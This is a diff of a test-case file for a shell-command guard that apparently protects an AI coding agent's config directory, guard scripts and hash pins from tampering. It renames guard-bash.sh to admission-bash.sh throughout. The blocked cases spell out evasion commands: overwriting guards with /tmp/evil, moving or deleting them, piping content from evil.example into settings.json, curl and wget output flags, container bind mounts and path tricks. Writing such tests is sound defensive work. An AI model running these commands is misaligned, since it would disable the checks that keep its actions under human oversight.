-{"id":"tok-206-bare-form-control","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {cfg}/bin/guard-bash.sh"}
-{"id":"tok-206-brace-in-operand-pos","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {{cfg}/bin/guard-bash.sh,/tmp/x}"}
-{"id":"tok-206-env-i-s","rule":"mutate-onto-surface","want":"block","cmd":"env -i -S 'cp /tmp/evil {cfg}/bin/guard-bash.sh'"}
-{"id":"tok-206-env-s","rule":"mutate-onto-surface","want":"block","cmd":"env -S 'cp /tmp/evil {cfg}/bin/guard-bash.sh'"}
+{"id":"tok-206-bare-form-control","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {cfg}/bin/admission-bash.sh"}
+{"id":"tok-206-brace-in-operand-pos","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {{cfg}/bin/admission-bash.sh,/tmp/x}"}
+{"id":"tok-206-env-i-s","rule":"mutate-onto-surface","want":"block","cmd":"env -i -S 'cp /tmp/evil {cfg}/bin/admission-bash.sh'"}
+{"id":"tok-206-env-s","rule":"mutate-onto-surface","want":"block","cmd":"env -S 'cp /tmp/evil {cfg}/bin/admission-bash.sh'"}
 {"id":"tok-206-env-s-of-benign-code","rule":"mutate-onto-surface","want":"allow","cmd":"env -S 'echo hello'"}
-{"id":"tok-206-env-split-string","rule":"mutate-onto-surface","want":"block","cmd":"env --split-string='cp /tmp/evil {cfg}/bin/guard-bash.sh'"}
-{"id":"tok-206-env-vs-bundled","rule":"mutate-onto-surface","want":"block","cmd":"env -vS 'cp /tmp/evil {cfg}/bin/guard-bash.sh'"}
+{"id":"tok-206-env-split-string","rule":"mutate-onto-surface","want":"block","cmd":"env --split-string='cp /tmp/evil {cfg}/bin/admission-bash.sh'"}
+{"id":"tok-206-env-vs-bundled","rule":"mutate-onto-surface","want":"block","cmd":"env -vS 'cp /tmp/evil {cfg}/bin/admission-bash.sh'"}
 {"id":"tok-206-env-with-assignments","rule":"mutate-onto-surface","want":"allow","cmd":"env FOO=1 ls"}
 {"id":"tok-206-find-exec-unharmed","rule":"mutate-onto-surface","want":"allow","cmd":"find . -name *.sh -exec /usr/bin/grep -l x {} ;"}
 {"id":"tok-206-ordinary-brace-copy","rule":"mutate-onto-surface","want":"allow","cmd":"cp /tmp/file{1,2} /tmp/dst/"}
@@ -245,8 +245,8 @@
 {"id":"tok-206-var-is-not-a-list","rule":"mutate-onto-surface","want":"allow","cmd":"echo ${HOME}"}
 {"id":"u3-copy-onto-a-surface","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/settings.json {home}/.claude/settings.json"}
 {"id":"v1-cp-trailing-redirect","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/x ~/.claude/settings.json 2>/dev/null"}
-{"id":"v1-user-spelling","rule":"mutate-aimed-surface","want":"block","cmd":"rm -f ~someone/.claude/bin/guard-bash.sh"}
-{"id":"w1-mv-a-guard-out","rule":"mutate-aimed-surface","want":"block","cmd":"mv {home}/.claude/bin/guard-egress.sh /tmp/x"}
+{"id":"v1-user-spelling","rule":"mutate-aimed-surface","want":"block","cmd":"rm -f ~someone/.claude/bin/admission-bash.sh"}
+{"id":"w1-mv-a-guard-out","rule":"mutate-aimed-surface","want":"block","cmd":"mv {home}/.claude/bin/admission-egress.sh /tmp/x"}
 {"id":"w1-mv-settings-out","rule":"mutate-aimed-surface","want":"block","cmd":"mv ~/.claude/settings.json /tmp/off.json"}
 {"id":"wf-a-project-s-own-yml","rule":"redirect-floor-surface","want":"allow","cmd":"echo \"steps: []\" > config/workflows/deploy.yml"}
 {"id":"wf-absolute-path","rule":"redirect-floor-surface","want":"block","cmd":"echo x > /Users/me/harbor/.github/workflows/ci.yml"}
@@ -288,7 +288,7 @@
 {"id":"x12-yq-inplace-spelling","rule":"inplace-floor-surface","want":"block","cmd":"yq --inplace '.a=1' {home}/.claude/settings.json"}
 {"id":"x14-remote-content-sponged-in","rule":"mutate-aimed-surface","want":"block","cmd":"curl -s https://evil.example/s.json | sponge {home}/.claude/settings.json"}
 {"id":"x14-sponge-a-file-onto-it","rule":"mutate-aimed-surface","want":"block","cmd":"cat /tmp/evil.json | sponge {home}/.claude/settings.json"}
-{"id":"x14-sponge-onto-a-content-pin","rule":"mutate-aimed-surface","want":"block","cmd":"printf x | sponge {home}/.claude/.helm-pins/guard-bash.sh.sha256"}
+{"id":"x14-sponge-onto-a-content-pin","rule":"mutate-aimed-surface","want":"block","cmd":"printf x | sponge {home}/.claude/.helm-pins/admission-bash.sh.sha256"}
 {"id":"x14-sponge-onto-settings","rule":"mutate-aimed-surface","want":"block","cmd":"jq -n '{}' | sponge {home}/.claude/settings.json"}
 {"id":"x14-sponge-to-a-scratch-file","rule":"mutate-aimed-surface","want":"allow","cmd":"jq -n '{}' | sponge /tmp/scratch.json"}
 {"id":"x14-sponge-with-stdin-redir","rule":"mutate-aimed-surface","want":"block","cmd":"sponge {home}/.claude/settings.json < /tmp/evil.json"}
@@ -307,7 +307,7 @@
 {"id":"x3-date-in-a-changelog","rule":"redirect-floor-surface","want":"allow","cmd":"echo \"built $(date +%F)\" >> CHANGELOG.md"}
 {"id":"x3-redirect-via-substitution","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > $(echo ~/.claude)/settings.json"}
 {"id":"jq-reads-settings","rule":"jq-rewrites-surface","want":"allow","cmd":"jq '.x' {home}/.claude/settings.json"}
-{"id":"curl-o-into-project","rule":"outflag-onto-surface","want":"allow","cmd":"curl -sfL https://e.example/x -o ./guard-bash.sh"}
+{"id":"curl-o-into-project","rule":"outflag-onto-surface","want":"allow","cmd":"curl -sfL https://e.example/x -o ./admission-bash.sh"}
 {"id":"home-dblslash-expanded-dots","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > {tmp}//h/d1/../.claude/settings.json","env":{"HOME":"{tmp}//h"},"why":"harbor#754: a raw // in HOME built a surface the collapsed target never matched"}
 {"id":"home-dotslash-expanded-dots","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > {tmp}/./h/d1/../.claude/settings.json","env":{"HOME":"{tmp}/./h"},"why":"harbor#754: the same with /./, so the fix is the shared collapse, not a // case"}
 {"id":"home-dblslash-sibling-file","rule":"redirect-floor-surface","want":"allow","cmd":"echo {} > {tmp}//h/d1/../notes.json","env":{"HOME":"{tmp}//h"}}
@@ -331,7 +331,7 @@
 {"id":"bashc-dotdot-from-claude-named-sibling","rule":"redirect-floor-surface","want":"block","cmd":"bash -c 'echo {} > ~/.claude-old/../.claude/settings.json'","why":"harbor#759"}
 {"id":"bashc-dotdot-out-of-home-and-back","rule":"redirect-floor-surface","want":"block","cmd":"bash -c 'echo {} > ~/../home/.claude/settings.json'","why":"harbor#759: only the home-expanded spelling can resolve ~/../<home name>"}
 {"id":"bashc-dotdot-sh-double-quoted","rule":"redirect-floor-surface","want":"block","cmd":"sh -c \"echo {} > ~/d1/../.claude/settings.json\"","why":"harbor#759"}
-{"id":"bashc-dotdot-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"bash -c 'cp /tmp/evil ~/d1/../.claude/bin/guard-bash.sh'"}
+{"id":"bashc-dotdot-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"bash -c 'cp /tmp/evil ~/d1/../.claude/bin/admission-bash.sh'"}
 {"id":"root-dotdot-redirect","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > /..{home}/.claude/settings.json","why":"harbor#759: /.. is /, so a .. above the root stays at the root"}
 {"id":"root-dotdot-twice-redirect","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > /../..{home}/.claude/settings.json","why":"harbor#759"}
 {"id":"root-dotdot-after-an-operand","rule":"redirect-floor-surface","want":"block","cmd":"cat /tmp/x > /..{home}/.claude/settings.json","why":"harbor#759: the .. starts a new word, so it must not cancel the operand before it"}
@@ -345,7 +345,7 @@
 {"id":"bashc-cd-dotdot-ls","rule":"redirect-floor-surface","want":"allow","cmd":"bash -c 'cd .. && ls'"}
 {"id":"bashc-url-dotdot","rule":"redirect-floor-surface","want":"allow","cmd":"bash -c 'curl -fsSL https://example.com/a/../b -o /tmp/x'","why":"harbor#759"}
 {"id":"bashc-raw-kept-inplace","rule":"inplace-floor-surface","want":"block","cmd":"bash -c 'sed -i s/a/b/ ~/.claude/settings.json && ls a/../../b'","why":"harbor#759: the collapse is lexical and cancels `.claude/settings.json && ls a` here, so only the raw line still names the surface"}
-{"id":"bashc-raw-kept-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"bash -c 'cp /tmp/evil ~/.claude/bin/guard-bash.sh && ls a/../../../b'","why":"harbor#759: the same, for a flat rule with no segment twin"}
+{"id":"bashc-raw-kept-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"bash -c 'cp /tmp/evil ~/.claude/bin/admission-bash.sh && ls a/../../../b'","why":"harbor#759: the same, for a flat rule with no segment twin"}
 {"id":"home-root-live-dir","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > /.claude/settings.json","env":{"HOME":"/"},"why":"harbor#758: HOME=/ built //.claude, which no collapsed target matches"}
 {"id":"snap772-cp","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/x.tgz ~/.claude/backups/deploy-1/config.tgz"}
 {"id":"snap772-cp-into-dir","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/x.tgz {cfg}/backups/deploy-1/"}
@@ -378,24 +378,24 @@
 {"id":"snap772-name-is-not-the-dir","rule":"redirect-into-cfg","want":"allow","cmd":"echo x >> ~/.claude/MEMORY/backups-policy.md","why":"only the top-level backups/ is a surface"}
 {"id":"snap772-deploy-dry-run","rule":"mutate-onto-surface","want":"allow","cmd":"sh bin/deploy.sh --live"}
 {"id":"tar-create-onto-settings","rule":"tar-archive-at-surface","want":"block","cmd":"tar -cf ~/.claude/settings.json -C /tmp pl"}
-{"id":"tar-create-onto-guard","rule":"tar-archive-at-surface","want":"block","cmd":"TAR -cf {cfg}/bin/guard-bash.sh -C /tmp pl"}
+{"id":"tar-create-onto-guard","rule":"tar-archive-at-surface","want":"block","cmd":"TAR -cf {cfg}/bin/admission-bash.sh -C /tmp pl"}
 {"id":"tar-create-oversized","rule":"tar-archive-at-surface","want":"block","cmd":"tar -czf {cfg}/backups/deploy-1/config.tgz -C /tmp pl","pad":33000}
 {"id":"tar-create-from-surface-stays-open","rule":"tar-archive-at-surface","want":"allow","cmd":"tar -czf /tmp/cfg.tgz ~/.claude/settings.json {cfg}/CLAUDE.md"}
 {"id":"tar-extract-unlink-reads-snapshot","rule":"tar-archive-at-surface","want":"allow","cmd":"tar -xUzf {cfg}/backups/deploy-1/config.tgz -C /tmp/restore","why":"U is unlink-first, not update: the snapshot is the source"}
 {"id":"snap772-cd-cfg-then-cp","rule":"mutate-onto-surface","want":"block","cmd":"cd {cfg} && cp /tmp/x.tgz backups/deploy-1/config.tgz"}
 {"id":"snap772-cd-into-then-list","rule":"mutate-aimed-surface","want":"allow","cmd":"cd {cfg}/backups && ls -la deploy-1 && tar -tzf deploy-1/config.tgz"}
 {"id":"fs788-curl-so-bundled","rule":"outflag-onto-surface","want":"block","cmd":"curl -so ~/.claude/settings.json https://e.example/x","why":"harbor#788: a short-flag bundle ending in o carries -o"}
-{"id":"fs788-curl-sSLo-bundled","rule":"outflag-onto-surface","want":"block","cmd":"curl -sSLo ~/.claude/bin/guard-bash.sh https://e.example/x"}
+{"id":"fs788-curl-sSLo-bundled","rule":"outflag-onto-surface","want":"block","cmd":"curl -sSLo ~/.claude/bin/admission-bash.sh https://e.example/x"}
 {"id":"fs788-curl-o-attached","rule":"outflag-onto-surface","want":"block","cmd":"curl -s -o~/.claude/settings.json https://e.example/x","why":"harbor#788: getopt takes the rest of the token as the value"}
 {"id":"fs788-curl-so-attached","rule":"outflag-onto-surface","want":"block","cmd":"curl -so{home}/.claude/settings.json https://e.example/x"}
-{"id":"fs788-wget-qO-bundled","rule":"outflag-onto-surface","want":"block","cmd":"wget -qO ~/.claude/bin/guard-lib.sh https://e.example/x"}
-{"id":"fs788-sort-so-bundled","rule":"outflag-onto-surface","want":"block","cmd":"sort -so ~/.claude/bin/guard-bash.sh /tmp/evil"}
+{"id":"fs788-wget-qO-bundled","rule":"outflag-onto-surface","want":"block","cmd":"wget -qO ~/.claude/bin/library-admission.sh https://e.example/x"}
+{"id":"fs788-sort-so-bundled","rule":"outflag-onto-surface","want":"block","cmd":"sort -so ~/.claude/bin/admission-bash.sh /tmp/evil"}
 {"id":"fs788-curl-so-after-cd","rule":"outflag-onto-surface","want":"block","cmd":"cd ~ && curl -so .claude/settings.json https://e.example/x"}
 {"id":"fs788-curl-s-o-control","rule":"outflag-onto-surface","want":"block","cmd":"curl -s -o ~/.claude/settings.json https://e.example/x","why":"harbor#788 control: the split spelling blocked before the fix"}
 {"id":"fs788-curl-so-into-tmp","rule":"outflag-onto-surface","want":"allow","cmd":"curl -so /tmp/x https://e.example/x"}
 {"id":"fs788-curl-sO-takes-no-value","rule":"outflag-onto-surface","want":"allow","cmd":"curl -sO https://e.example/pkg.tgz"}
 {"id":"fs788-wget-qO-dash","rule":"outflag-onto-surface","want":"allow","cmd":"wget -qO- https://e.example/latest"}
-{"id":"fs788-grep-lo-a-guard","rule":"outflag-onto-surface","want":"allow","cmd":"grep -lo floor_block ~/.claude/bin/guard-bash.sh"}
+{"id":"fs788-grep-lo-a-guard","rule":"outflag-onto-surface","want":"allow","cmd":"grep -lo floor_block ~/.claude/bin/admission-bash.sh"}
 {"id":"fs788-ps-eo","rule":"outflag-onto-surface","want":"allow","cmd":"ps -eo pid,comm"}
 {"id":"fs788-tar-O-reads-a-snapshot","rule":"outflag-onto-surface","want":"allow","cmd":"tar -xzOf ~/.claude/backups/deploy-1/config.tgz settings.json"}
 {"id":"fs788-ssh-o-option","rule":"outflag-onto-surface","want":"allow","cmd":"ssh -oStrictHostKeyChecking=no host true"}
@@ -406,7 +406,7 @@
 {"id":"bind797-docker-volume-eq-config-dir","rule":"container-bind-surface","want":"block","cmd":"docker run --volume={cfg}/:/c alpine sh","why":"harbor#797"}
 {"id":"bind797-docker-bundled-flag","rule":"container-bind-surface","want":"block","cmd":"docker run -itv {cfg}/hooks:/h alpine sh","why":"harbor#797: -itv is -i -t -v"}
 {"id":"bind797-docker-mount-source","rule":"container-bind-surface","want":"block","cmd":"docker run --mount type=bind,source={cfg},target=/c alpine sh","why":"harbor#797"}
-{"id":"bind797-docker-mount-src-last","rule":"container-bind-surface","want":"block","cmd":"docker run --mount=dst=/b,src={cfg}/bin/guard-bash.sh,type=bind alpine sh","why":"harbor#797: the keys come in any order"}
+{"id":"bind797-docker-mount-src-last","rule":"container-bind-surface","want":"block","cmd":"docker run --mount=dst=/b,src={cfg}/bin/admission-bash.sh,type=bind alpine sh","why":"harbor#797: the keys come in any order"}
 {"id":"bind797-podman-home-spelled","rule":"container-bind-surface","want":"block","cmd":"podman run --rm -v \"$HOME/.claude\":/c:ro alpine sh","why":"harbor#797: podman too; read-only is not an exemption for a surface"}
 {"id":"bind797-podman-pins","rule":"container-bind-surface","want":"block","cmd":"podman run -v {cfg}/.helm-pins:/p alpine sh","why":"harbor#797"}
 {"id":"bind797-docker-home-absolute","rule":"container-bind-surface","want":"block","cmd":"docker run -v {home}:/h alpine sh","why":"harbor#797: a dir above the config dir holds it"}
@@ -444,7 +444,7 @@
 {"id":"gw804-fp-cd-project-reset","rule":"git-write-at-surface","want":"allow","cmd":"cd /tmp/proj && git reset --hard","why":"harbor#804: a cd into a project dir does not fold onto the config dir"}
 {"id":"touch794-settings","rule":"mutate-aimed-surface","want":"block","cmd":"touch {cfg}/settings.json","why":"harbor#794: REF-7 compares its mtime with the salt's (allow before)"}
 {"id":"touch794-claude-md","rule":"mutate-aimed-surface","want":"block","cmd":"touch {cfg}/CLAUDE.md","why":"harbor#794"}
-{"id":"touch794-guard","rule":"mutate-aimed-surface","want":"block","cmd":"touch {cfg}/bin/guard-bash.sh","why":"harbor#794"}
+{"id":"touch794-guard","rule":"mutate-aimed-surface","want":"block","cmd":"touch {cfg}/bin/admission-bash.sh","why":"harbor#794"}
 {"id":"touch794-hooks","rule":"mutate-aimed-surface","want":"block","cmd":"touch {cfg}/hooks/new-hook.sh","why":"harbor#794: an empty file created under hooks/"}
 {"id":"touch794-snapshot","rule":"mutate-aimed-surface","want":"block","cmd":"touch {cfg}/backups/deploy-1/config.tgz","why":"harbor#794: a deploy snapshot"}
 {"id":"touch794-teeth-t","rule":"mutate-aimed-surface","want":"block","cmd":"touch -t 202601010000 {cfg}/.helm-floor-teeth","why":"harbor#794: -t takes a value"}
@@ -454,7 +454,7 @@
 {"id":"touch794-two-operands","rule":"mutate-aimed-surface","want":"block","cmd":"touch /tmp/a {cfg}/settings.local.json","why":"harbor#794: the surface is not the first operand"}
 {"id":"touch794-abs-verb","rule":"mutate-aimed-surface","want":"block","cmd":"/usr/bin/touch {cfg}/settings.json","why":"harbor#794: a path-prefixed verb"}
 {"id":"touch794-live-tilde","rule":"mutate-aimed-surface","want":"block","cmd":"touch ~/.claude/settings.json","why":"harbor#794: the live dir"}
-{"id":"touch794-live-home-var","rule":"mutate-aimed-surface","want":"block","cmd":"touch $HOME/.claude/.helm-pins/guard-bash.sh.sha256","why":"harbor#794"}
+{"id":"touch794-live-home-var","rule":"mutate-aimed-surface","want":"block","cmd":"touch $HOME/.claude/.helm-pins/admission-bash.sh.sha256","why":"harbor#794"}
 {"id":"touch794-workflow","rule":"mutate-aimed-surface","want":"block","cmd":"touch .github/workflows/new.yml","why":"harbor#794: a workflow file is a surface for every other verb"}
 {"id":"touch794-after-and","rule":"mutate-aimed-surface","want":"block","cmd":"sleep 1 && touch {cfg}/.helm-snapshots","why":"harbor#794"}
 {"id":"touch794-bash-c","rule":"mutate-aimed-surface","want":"block","cmd":"bash -c 'touch {cfg}/.helm-snapshots'","why":"harbor#794"}
@@ -466,7 +466,7 @@
 {"id":"touch794-cd-memory","rule":"cd-cfg-then-mutate","want":"allow","cmd":"cd {cfg}/projects/p/memory && touch new-note.md","why":"harbor#794 control"}
 {"id":"touch794-project-claude","rule":"mutate-aimed-surface","want":"allow","cmd":"touch .claude/settings.local.json","why":"harbor#794 control: a project's own .claude/ is not the config dir"}
 {"id":"touch794-reader-names-surface","rule":"mutate-aimed-surface","want":"allow","cmd":"ls -la {cfg}/settings.json && touch /tmp/stamp794","why":"harbor#794 control: the surface is another segment's read"}
-{"id":"touch794-grep-for-touch","rule":"mutate-aimed-surface","want":"allow","cmd":"grep -n touch {cfg}/bin/guard-bash.sh","why":"harbor#794 control: the word in a read (harbor#107 veto)"}
+{"id":"touch794-grep-for-touch","rule":"mutate-aimed-surface","want":"allow","cmd":"grep -n touch {cfg}/bin/admission-bash.sh","why":"harbor#794 control: the word in a read (harbor#107 veto)"}
 {"id":"touch794-find-exec-abs","rule":"mutate-aimed-surface","want":"block","cmd":"find {cfg}/bin -name '*.sh' -exec touch {} +","why":"harbor#794: a find child"}
 {"id":"touch794-find-exec-cwd","rule":"cd-cfg-then-mutate","want":"block","cmd":"cd {cfg}/bin && find . -name '*.sh' -exec touch {} \\;","why":"harbor#794: a find child with a relative root inside bin/"}
 {"id":"touch794-find-exec-elsewhere","rule":"mutate-aimed-surface","want":"allow","cmd":"find /tmp/x794 -name '*.log' -exec touch {} +","why":"harbor#794 control"}
